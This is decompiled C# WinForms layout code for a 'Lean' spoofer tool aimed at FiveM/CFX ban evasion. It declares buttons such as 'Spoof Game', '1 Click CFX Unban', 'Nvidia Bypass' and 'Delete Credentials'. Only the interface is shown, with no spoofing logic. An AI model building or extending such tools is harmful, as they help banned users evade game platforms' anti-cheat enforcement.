			this.br.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.br.FocusedState.Parent = this.br;
			this.br.ForeColor = Color.Red;
			this.br.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.br.HoveredState.Parent = this.br;
			this.br.Location = new Point(211, 178);
			this.br.Margin = new Padding(4);
			this.br.Name = "enterip";
			this.br.PasswordChar = '\0';
			this.br.PlaceholderText = "";
			this.br.SelectedText = "";
			this.br.ShadowDecoration.Parent = this.br;
			this.br.Size = new Size(109, 22);
			this.br.TabIndex = 73;
			this.br.TextAlign = HorizontalAlignment.Center;
			this.an.BackColor = Color.Transparent;
			this.i.SetDecoration(this.an, 0);
			this.an.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.an.ForeColor = Color.White;
			this.an.Location = new Point(143, 115);
			this.an.Margin = new Padding(2);
			this.an.Name = "siticoneLabel5";
			this.an.Size = new Size(66, 15);
			this.an.TabIndex = 69;
			this.an.Text = "Select Game";
			this.am.BorderColor = Color.DarkRed;
			this.am.BorderThickness = 1;
			this.am.CheckedState.Parent = this.am;
			this.am.CustomImages.Parent = this.am;
			this.i.SetDecoration(this.am, 0);
			this.am.FillColor = Color.Black;
			this.am.Font = new Font("Segoe UI", 9f);
			this.am.ForeColor = Color.Red;
			this.am.HoveredState.Parent = this.am;
			this.am.Location = new Point(127, 212);
			this.am.Name = "siticoneRoundedButton9";
			this.am.ShadowDecoration.Parent = this.am;
			this.am.Size = new Size(209, 29);
			this.am.TabIndex = 64;
			this.am.Text = "Spoof Game";
			this.am.Click += this.ab;
			this.aj.BackColor = Color.Transparent;
			this.i.SetDecoration(this.aj, 0);
			this.aj.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.aj.ForeColor = Color.Red;
			this.aj.Location = new Point(65, 34);
			this.aj.Margin = new Padding(2);
			this.aj.Name = "siticoneLabel1";
			this.aj.Size = new Size(76, 15);
			this.aj.TabIndex = 62;
			this.aj.Text = "Cache Cleaner";
			this.i.SetDecoration(this.ak, 0);
			this.ak.Image = Resources.game;
			this.ak.Location = new Point(11, 10);
			this.ak.Name = "pictureBox2";
			this.ak.Size = new Size(46, 35);
			this.ak.SizeMode = PictureBoxSizeMode.Zoom;
			this.ak.TabIndex = 25;
			this.ak.TabStop = false;
			this.al.AutoSize = true;
			this.i.SetDecoration(this.al, 0);
			this.al.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.al.ForeColor = Color.White;
			this.al.Location = new Point(60, 6);
			this.al.Name = "label3";
			this.al.Size = new Size(93, 32);
			this.al.TabIndex = 9;
			this.al.Text = "Games";
			this.ao.AccessibleDescription = "Choose Game";
			this.ao.AccessibleName = "";
			this.ao.BackColor = Color.Black;
			this.ao.BorderColor = Color.Black;
			this.i.SetDecoration(this.ao, 0);
			this.ao.DrawMode = DrawMode.OwnerDrawFixed;
			this.ao.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ao.FillColor = Color.Black;
			this.ao.FocusedColor = Color.Black;
			this.ao.Font = new Font("Segoe UI", 10f);
			this.ao.ForeColor = Color.Red;
			this.ao.FormattingEnabled = true;
			this.ao.HoveredState.BorderColor = Color.FromArgb(26, 32, 54);
			this.ao.HoveredState.FillColor = Color.FromArgb(26, 32, 54);
			this.ao.HoveredState.Parent = this.ao;
			this.ao.ItemHeight = 30;
			this.ao.Items.AddRange(new object[]
			{
				"FiveM"
			});
			this.ao.ItemsAppearance.Parent = this.ao;
			this.ao.Location = new Point(136, 130);
			this.ao.Name = "MethodCB";
			this.ao.ShadowDecoration.Parent = this.ao;
			this.ao.Size = new Size(184, 36);
			this.ao.TabIndex = 68;
			this.ao.Tag = "";
			this.ao.SelectedIndexChanged += this.af;
			this.ap.BackColor = Color.Transparent;
			this.ap.Controls.Add(this.bo);
			this.ap.Controls.Add(this.bn);
			this.ap.Controls.Add(this.bg);
			this.ap.Controls.Add(this.bh);
			this.ap.Controls.Add(this.bd);
			this.ap.Controls.Add(this.aq);
			this.ap.Controls.Add(this.ar);
			this.ap.Controls.Add(this.@as);
			this.ap.Controls.Add(this.p);
			this.i.SetDecoration(this.ap, 0);
			this.ap.FillColor = Color.Black;
			this.ap.ForeColor = Color.Crimson;
			this.ap.Location = new Point(195, 34);
			this.ap.Name = "settingspanel";
			this.ap.ShadowColor = Color.Black;
			this.ap.Size = new Size(455, 311);
			this.ap.TabIndex = 72;
			this.ap.Paint += this.aq;
			this.bo.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bo, 0);
			this.bo.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bo.ForeColor = Color.White;
			this.bo.Location = new Point(233, 295);
			this.bo.Margin = new Padding(2);
			this.bo.Name = "siticoneLabel11";
			this.bo.Size = new Size(78, 15);
			this.bo.TabIndex = 76;
			this.bo.Text = "Total Users: 99";
			this.bo.Click += this.bs;
			this.bn.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bn, 0);
			this.bn.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bn.ForeColor = Color.Red;
			this.bn.Location = new Point(223, 295);
			this.bn.Margin = new Padding(2);
			this.bn.Name = "siticoneLabel6";
			this.bn.Size = new Size(7, 15);
			this.bn.TabIndex = 75;
			this.bn.Text = "|";
			this.bg.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bg, 0);
			this.bg.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.bg.ForeColor = Color.Red;
			this.bg.Location = new Point(37, 131);
			this.bg.Margin = new Padding(2);
			this.bg.Name = "siticoneLabel10";
			this.bg.Size = new Size(66, 17);
			this.bg.TabIndex = 73;
			this.bg.Text = "Disk Name: ";
			this.bh.BorderColor = Color.WhiteSmoke;
			this.bh.BorderRadius = 3;
			this.bh.Cursor = Cursors.IBeam;
			this.i.SetDecoration(this.bh, 0);
			this.bh.DefaultText = "C";
			this.bh.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.bh.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.bh.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.bh.DisabledState.Parent = this.bh;
			this.bh.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.bh.FillColor = Color.Black;
			this.bh.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bh.FocusedState.Parent = this.bh;
			this.bh.ForeColor = Color.Red;
			this.bh.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bh.HoveredState.Parent = this.bh;
			this.bh.Location = new Point(107, 126);
			this.bh.Margin = new Padding(4);
			this.bh.Name = "diskname";
			this.bh.PasswordChar = '\0';
			this.bh.PlaceholderText = "";
			this.bh.SelectedText = "";
			this.bh.ShadowDecoration.Parent = this.bh;
			this.bh.Size = new Size(26, 28);
			this.bh.TabIndex = 72;
			this.bh.TextAlign = HorizontalAlignment.Center;
			this.bd.BorderColor = Color.Red;
			this.bd.BorderRadius = 4;
			this.bd.BorderThickness = 2;
			this.bd.CheckedState.Parent = this.bd;
			this.bd.CustomImages.Parent = this.bd;
			this.i.SetDecoration(this.bd, 0);
			this.bd.FillColor = Color.Black;
			this.bd.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bd.ForeColor = Color.White;
			this.bd.HoveredState.Parent = this.bd;
			this.bd.Location = new Point(30, 77);
			this.bd.Name = "siticoneButton2";
			this.bd.PressedColor = Color.FromArgb(26, 32, 54);
			this.bd.ShadowDecoration.Parent = this.bd;
			this.bd.Size = new Size(117, 32);
			this.bd.TabIndex = 71;
			this.bd.Text = "Delete Credentials";
			this.bd.Click += this.bc;
			this.aq.BackColor = Color.Transparent;
			this.i.SetDecoration(this.aq, 0);
			this.aq.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.aq.ForeColor = Color.Red;
			this.aq.Location = new Point(65, 34);
			this.aq.Margin = new Padding(2);
			this.aq.Name = "siticoneLabel7";
			this.aq.Size = new Size(101, 15);
			this.aq.TabIndex = 62;
			this.aq.Text = "Customize Spoofer";
			this.i.SetDecoration(this.ar, 0);
			this.ar.Image = Resources.kindpng_3933927;
			this.ar.Location = new Point(11, 10);
			this.ar.Name = "pictureBox3";
			this.ar.Size = new Size(46, 35);
			this.ar.SizeMode = PictureBoxSizeMode.Zoom;
			this.ar.TabIndex = 25;
			this.ar.TabStop = false;
			this.@as.AutoSize = true;
			this.i.SetDecoration(this.@as, 0);
			this.@as.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.@as.ForeColor = Color.White;
			this.@as.Location = new Point(60, 3);
			this.@as.Name = "label4";
			this.@as.Size = new Size(111, 32);
			this.@as.TabIndex = 9;
			this.@as.Text = "Settings";
			this.at.AutoSize = true;
			this.i.SetDecoration(this.at, 0);
			this.at.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.at.ForeColor = Color.Red;
			this.at.Location = new Point(116, 7);
			this.at.Margin = new Padding(2, 0, 2, 0);
			this.at.Name = "label7";
			this.at.Size = new Size(13, 19);
			this.at.TabIndex = 74;
			this.at.Text = "|";
			this.aw.AutoSize = true;
			this.i.SetDecoration(this.aw, 0);
			this.aw.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.aw.ForeColor = Color.White;
			this.aw.Location = new Point(130, 8);
			this.aw.Margin = new Padding(2, 0, 2, 0);
			this.aw.Name = "time";
			this.aw.Size = new Size(71, 19);
			this.aw.TabIndex = 75;
			this.aw.Text = "0:00:0000";
			this.ax.BackColor = Color.Transparent;
			this.i.SetDecoration(this.ax, 0);
			this.ax.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.ax.ForeColor = Color.Red;
			this.ax.Location = new Point(67, 317);
			this.ax.Margin = new Padding(2);
			this.ax.Name = "siticoneLabel8";
			this.ax.Size = new Size(62, 17);
			this.ax.TabIndex = 40;
			this.ax.Text = "Version 1.0";
			this.ax.Click += this.ar;
			this.ay.BackColor = Color.Transparent;
			this.ay.Controls.Add(this.bm);
			this.ay.Controls.Add(this.bl);
			this.ay.Controls.Add(this.bj);
			this.ay.Controls.Add(this.be);
			this.ay.Controls.Add(this.bv);
			this.ay.Controls.Add(this.bc);
			this.ay.Controls.Add(this.az);
			this.ay.Controls.Add(this.ba);
			this.ay.Controls.Add(this.bb);
			this.i.SetDecoration(this.ay, 0);
			this.ay.FillColor = Color.Black;
			this.ay.Location = new Point(195, 34);
			this.ay.Name = "premiumpanel";
			this.ay.ShadowColor = Color.Black;
			this.ay.Size = new Size(455, 311);
			this.ay.TabIndex = 73;
			this.ay.Paint += this.aw;
			this.bm.BorderColor = Color.DarkRed;
			this.bm.BorderThickness = 1;
			this.bm.CheckedState.Parent = this.bm;
			this.bm.CustomImages.Parent = this.bm;
			this.i.SetDecoration(this.bm, 0);
			this.bm.FillColor = Color.Black;
			this.bm.Font = new Font("Segoe UI", 9f);
			this.bm.ForeColor = Color.Red;
			this.bm.HoveredState.Parent = this.bm;
			this.bm.Location = new Point(303, 223);
			this.bm.Name = "premnew2";
			this.bm.ShadowDecoration.Parent = this.bm;
			this.bm.Size = new Size(123, 29);
			this.bm.TabIndex = 75;
			this.bm.Text = "G Life Unban";
			this.bm.Click += this.bp;
			this.bl.BorderColor = Color.DarkRed;
			this.bl.BorderThickness = 1;
			this.bl.CheckedState.Parent = this.bl;
			this.bl.CustomImages.Parent = this.bl;
			this.i.SetDecoration(this.bl, 0);
			this.bl.FillColor = Color.Black;
			this.bl.Font = new Font("Segoe UI", 9f);
			this.bl.ForeColor = Color.Red;
			this.bl.HoveredState.Parent = this.bl;
			this.bl.Location = new Point(30, 225);
			this.bl.Name = "premnew1";
			this.bl.ShadowDecoration.Parent = this.bl;
			this.bl.Size = new Size(123, 29);
			this.bl.TabIndex = 74;
			this.bl.Text = "Nvidia Bypass";
			this.bl.Click += this.bo;
			this.bj.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bj, 0);
			this.bj.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bj.ForeColor = Color.Red;
			this.bj.Location = new Point(107, 159);
			this.bj.Margin = new Padding(2);
			this.bj.Name = "paketo";
			this.bj.Size = new Size(229, 15);
			this.bj.TabIndex = 73;
			this.bj.Text = "You don't have access to premium options!";
			this.be.BorderColor = Color.DarkRed;
			this.be.BorderThickness = 1;
			this.be.CheckedState.Parent = this.be;
			this.be.CustomImages.Parent = this.be;
			this.i.SetDecoration(this.be, 0);
			this.be.FillColor = Color.Black;
			this.be.Font = new Font("Segoe UI", 9f);
			this.be.ForeColor = Color.Red;
			this.be.HoveredState.Parent = this.be;
			this.be.Location = new Point(25, 271);
			this.be.Name = "prem6";
			this.be.ShadowDecoration.Parent = this.be;
			this.be.Size = new Size(402, 29);
			this.be.TabIndex = 72;
			this.be.Text = "1 Click CFX Unban";
			this.be.Click += this.bk;
			this.bv.BorderColor = Color.DarkRed;
			this.bv.BorderThickness = 1;
			this.bv.CheckedState.Parent = this.bv;
			this.bv.CustomImages.Parent = this.bv;
			this.i.SetDecoration(this.bv, 0);
			this.bv.FillColor = Color.Black;
			this.bv.Font = new Font("Segoe UI", 9f);
			this.bv.ForeColor = Color.Red;
			this.bv.HoveredState.Parent = this.bv;
			this.bv.Location = new Point(303, 80);
			this.bv.Name = "prem4";
			this.bv.ShadowDecoration.Parent = this.bv;
			this.bv.Size = new Size(123, 29);
			this.bv.TabIndex = 71;
			this.bv.Text = "System Boost";
			this.bv.Click += this.bf;
			this.bc.BorderColor = Color.DarkRed;
			this.bc.BorderThickness = 1;
			this.bc.CheckedState.Parent = this.bc;
			this.bc.CustomImages.Parent = this.bc;
			this.i.SetDecoration(this.bc, 0);
			this.bc.FillColor = Color.Black;
			this.bc.Font = new Font("Segoe UI", 9f);
			this.bc.ForeColor = Color.Red;
			this.bc.HoveredState.Parent = this.bc;
			this.bc.Location = new Point(30, 82);
			this.bc.Name = "prem1";
			this.bc.ShadowDecoration.Parent = this.bc;
			this.bc.Size = new Size(123, 29);
			this.bc.TabIndex = 67;
			this.bc.Text = "Unlink All";
			this.bc.Click += this.ax;
			this.az.BackColor = Color.Transparent;
			this.i.SetDecoration(this.az, 0);
			this.az.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.az.ForeColor = Color.Red;
			this.az.Location = new Point(68, 34);
			this.az.Margin = new Padding(2);
			this.az.Name = "siticoneLabel9";
			this.az.Size = new Size(186, 15);
			this.az.TabIndex = 62;
			this.az.Text = "Custom Options for Premium Users";
			this.i.SetDecoration(this.ba, 0);
			this.ba.Image = Resources.pngaaa_com_3790696;
			this.ba.Location = new Point(11, 10);
			this.ba.Name = "pictureBox5";
			this.ba.Size = new Size(46, 35);
			this.ba.SizeMode = PictureBoxSizeMode.Zoom;
			this.ba.TabIndex = 25;
			this.ba.TabStop = false;
			this.bb.AutoSize = true;
			this.i.SetDecoration(this.bb, 0);
			this.bb.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.bb.ForeColor = Color.White;
			this.bb.Location = new Point(60, 6);
			this.bb.Name = "label6";
			this.bb.Size = new Size(221, 32);
			this.bb.TabIndex = 9;
			this.bb.Text = "Premium Options";
			this.bp.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bp, 0);
			this.bp.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bp.ForeColor = SystemColors.ButtonHighlight;
			this.bp.Location = new Point(663, 319);
			this.bp.Margin = new Padding(2);
			this.bp.Name = "usersng";
			this.bp.Size = new Size(44, 15);
			this.bp.TabIndex = 77;
			this.bp.Text = "usersng";
			this.bi.CheckedState.Parent = this.bi;
			this.bi.CustomImages.Parent = this.bi;
			this.i.SetDecoration(this.bi, 0);
			this.bi.FillColor = Color.Transparent;
			this.bi.FillColor2 = Color.Transparent;
			this.bi.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.bi.ForeColor = Color.White;
			this.bi.HoveredState.Parent = this.bi;
			this.bi.Image = Resources.PngItem_2354504;
			this.bi.Location = new Point(18, 209);
			this.bi.Name = "siticoneGradientButton1";
			this.bi.ShadowDecoration.Parent = this.bi;
			this.bi.Size = new Size(168, 52);
			this.bi.TabIndex = 76;
			this.bi.Text = "Premium";
			this.bi.Click += this.bl;
			this.y.CheckedState.Parent = this.y;
			this.y.CustomImages.Parent = this.y;
			this.i.SetDecoration(this.y, 0);
			this.y.FillColor = Color.Transparent;
			this.y.FillColor2 = Color.Transparent;
			this.y.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.y.ForeColor = Color.White;
			this.y.HoveredState.Parent = this.y;
			this.y.Image = Resources.game;
			this.y.Location = new Point(18, 151);
			this.y.Name = "siticoneGradientButton3";
			this.y.ShadowDecoration.Parent = this.y;
			this.y.Size = new Size(169, 51);
			this.y.TabIndex = 72;
			this.y.Text = "Games";
			this.y.Click += this.ac;
			this.z.CheckedState.Parent = this.z;
			this.z.CustomImages.Parent = this.z;
			this.i.SetDecoration(this.z, 0);
			this.z.FillColor = Color.Transparent;
			this.z.FillColor2 = Color.Transparent;
			this.z.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.z.ForeColor = Color.White;
			this.z.HoveredState.Parent = this.z;
			this.z.Image = Resources.pngaaa_com_3790696;
			this.z.Location = new Point(12, 93);
			this.z.Name = "siticoneGradientButton2";
			this.z.ShadowDecoration.Parent = this.z;
			this.z.Size = new Size(175, 52);
			this.z.TabIndex = 71;
			this.z.Text = "Spoofer";
			this.z.Click += this.aa;
			this.aa.CheckedState.Parent = this.aa;
			this.aa.CustomImages.Parent = this.aa;
			this.i.SetDecoration(this.aa, 0);
			this.aa.FillColor = Color.Transparent;
			this.aa.FillColor2 = Color.Transparent;
			this.aa.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.aa.ForeColor = Color.White;
			this.aa.HoveredState.Parent = this.aa;
			this.aa.Image = Resources.kindpng_3933927;
			this.aa.Location = new Point(11, 271);
			this.aa.Name = "siticoneGradientButton4";
			this.aa.ShadowDecoration.Parent = this.aa;
			this.aa.Size = new Size(175, 52);
			this.aa.TabIndex = 70;
			this.aa.Text = "Settings";
			this.aa.Click += this.ad;
			this.bu.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bu, 0);
			this.bu.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.bu.ForeColor = Color.Purple;
			this.bu.Location = new Point(37, 332);
			this.bu.Margin = new Padding(2);
			this.bu.Name = "siticoneLabel13";
			this.bu.Size = new Size(120, 17);
			this.bu.TabIndex = 78;
			this.bu.Text = "By Lean Development";
			this.bu.Click += this.bx;
			this.o.Enabled = true;
			this.o.Interval = 1;
			this.o.Tick += this.d;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.AutoValidate = AutoValidate.Disable;
			this.BackColor = Color.Black;
			base.ClientSize = new Size(662, 352);
			base.Controls.Add(this.bu);
			base.Controls.Add(this.bp);
			base.Controls.Add(this.bi);
			base.Controls.Add(this.ax);
			base.Controls.Add(this.aw);
			base.Controls.Add(this.at);
			base.Controls.Add(this.y);
			base.Controls.Add(this.z);
			base.Controls.Add(this.aa);
			base.Controls.Add(this.r);
			base.Controls.Add(this.k);
			base.Controls.Add(this.j);
			base.Controls.Add(this.h);
			base.Controls.Add(this.g);
			base.Controls.Add(this.ai);
			base.Controls.Add(this.ay);
			base.Controls.Add(this.u);
			base.Controls.Add(this.ap);
			this.i.SetDecoration(this, 1);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Main";
			base.Opacity = 0.85;
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Lean Main";
			base.TransparencyKey = Color.Maroon;
			base.Load += this.b;
			this.r.ResumeLayout(false);
			this.r.PerformLayout();
			((ISupportInitialize)this.s).EndInit();
			this.u.ResumeLayout(false);
			this.u.PerformLayout();
			((ISupportInitialize)this.w).EndInit();
			this.ai.ResumeLayout(false);
			this.ai.PerformLayout();
			((ISupportInitialize)this.ak).EndInit();
			this.ap.ResumeLayout(false);
			this.ap.PerformLayout();
			((ISupportInitialize)this.ar).EndInit();
			this.ay.ResumeLayout(false);
			this.ay.PerformLayout();
			((ISupportInitialize)this.ba).EndInit();
			((ISupportInitialize)this.q).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000012 RID: 18
		private DiscordRpc.EventHandlers a;

		// Token: 0x04000013 RID: 19
		private DiscordRpc.RichPresence b;

		// Token: 0x04000014 RID: 20
		public static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000015 RID: 21
		public static string specificFolder = Path.Combine(Main.folder, "DigitalEntitlements");

		// Token: 0x04000016 RID: 22
		public static Random random = new Random();

		// Token: 0x04000017 RID: 23
		private string c = Main.RandomString(5);

		// Token: 0x04000018 RID: 24
		private List<Process> d = new List<Process>();

		// Token: 0x0400001A RID: 26
		private SiticoneDragControl f;

		// Token: 0x0400001B RID: 27
		private SiticoneControlBox g;

		// Token: 0x0400001C RID: 28
		private SiticoneControlBox h;

		// Token: 0x0400001D RID: 29
		private SiticoneTransition i;

		// Token: 0x0400001E RID: 30
		private Label j;

		// Token: 0x0400001F RID: 31
		private Label k;

		// Token: 0x04000020 RID: 32
		private SiticoneShadowForm l;

		// Token: 0x04000021 RID: 33
		private SiticoneLabel m;

		// Token: 0x04000022 RID: 34
		private SiticoneLabel n;

		// Token: 0x04000023 RID: 35
		private System.Windows.Forms.Timer o;

		// Token: 0x04000024 RID: 36
		private SiticoneLabel p;

		// Token: 0x04000025 RID: 37
		private BindingSource q;

		// Token: 0x04000026 RID: 38
		private Panel r;

		// Token: 0x04000027 RID: 39
		private PictureBox s;

		// Token: 0x04000028 RID: 40
		private SiticoneLabel t;

		// Token: 0x04000029 RID: 41
		private SiticoneShadowPanel u;

		// Token: 0x0400002A RID: 42
		private SiticoneLabel v;

		// Token: 0x0400002B RID: 43
		private PictureBox w;

		// Token: 0x0400002C RID: 44
		private Label x;

		// Token: 0x0400002D RID: 45
		private SiticoneGradientButton y;

		// Token: 0x0400002E RID: 46
		private SiticoneGradientButton z;

		// Token: 0x0400002F RID: 47
		private SiticoneGradientButton aa;

		// Token: 0x04000030 RID: 48
		private SiticoneRoundedButton ab;

		// Token: 0x04000031 RID: 49
		private SiticoneRoundedButton ac;

		// Token: 0x04000032 RID: 50
		private SiticoneRoundedButton ad;

		// Token: 0x04000033 RID: 51
		private SiticoneRoundedButton ae;

		// Token: 0x04000034 RID: 52
		private SiticoneRoundedButton af;

		// Token: 0x04000035 RID: 53
		private SiticoneRoundedButton ag;

		// Token: 0x04000036 RID: 54
		private SiticoneRoundedButton ah;

		// Token: 0x04000037 RID: 55
		private SiticoneShadowPanel ai;

		// Token: 0x04000038 RID: 56
		private SiticoneLabel aj;

		// Token: 0x04000039 RID: 57
		private PictureBox ak;

		// Token: 0x0400003A RID: 58
		private Label al;

		// Token: 0x0400003B RID: 59
		private SiticoneRoundedButton am;

		// Token: 0x0400003C RID: 60
		private SiticoneLabel an;

		// Token: 0x0400003D RID: 61
		private SiticoneComboBox ao;

		// Token: 0x0400003E RID: 62
		private SiticoneShadowPanel ap;

		// Token: 0x0400003F RID: 63
		private SiticoneLabel aq;

		// Token: 0x04000040 RID: 64
		private PictureBox ar;

		// Token: 0x04000041 RID: 65
		private Label @as;

		// Token: 0x04000042 RID: 66
		private Label at;

		// Token: 0x04000043 RID: 67
		private PageSetupDialog au;

		// Token: 0x04000044 RID: 68
		private System.Windows.Forms.Timer av;

		// Token: 0x04000045 RID: 69
		private Label aw;

		// Token: 0x04000046 RID: 70
		private SiticoneLabel ax;

		// Token: 0x04000047 RID: 71
		private SiticoneShadowPanel ay;

		// Token: 0x04000048 RID: 72
		private SiticoneLabel az;

		// Token: 0x04000049 RID: 73
		private PictureBox ba;

		// Token: 0x0400004A RID: 74
		private Label bb;

		// Token: 0x0400004B RID: 75
		private SiticoneRoundedButton bc;

		// Token: 0x0400004C RID: 76
		private SiticoneButton bd;

		// Token: 0x0400004D RID: 77
		private SiticoneRoundedButton be;

		// Token: 0x0400004E RID: 78
		private SiticoneRoundedButton bf;

		// Token: 0x0400004F RID: 79
		private SiticoneLabel bg;

		// Token: 0x04000050 RID: 80
		private SiticoneTextBox bh;

		// Token: 0x04000051 RID: 81
		private SiticoneGradientButton bi;

		// Token: 0x04000052 RID: 82
		private SiticoneLabel bj;

		// Token: 0x04000053 RID: 83
		private SiticoneRoundedButton bk;

		// Token: 0x04000054 RID: 84
		private SiticoneRoundedButton bl;

		// Token: 0x04000055 RID: 85
		private SiticoneRoundedButton bm;

		// Token: 0x04000056 RID: 86
		private SiticoneLabel bn;

		// Token: 0x04000057 RID: 87
		private SiticoneLabel bo;

		// Token: 0x04000058 RID: 88
		private SiticoneLabel bp;

		// Token: 0x04000059 RID: 89
		private SiticoneLabel bq;

		// Token: 0x0400005A RID: 90
		private SiticoneTextBox br;

		// Token: 0x0400005B RID: 91
		private System.Windows.Forms.Timer bs;

		// Token: 0x0400005C RID: 92
		private SiticoneButton bt;

		// Token: 0x0400005D RID: 93
		private SiticoneLabel bu;

		// Token: 0x0400005E RID: 94
		private SiticoneRoundedButton bv;
	}
}
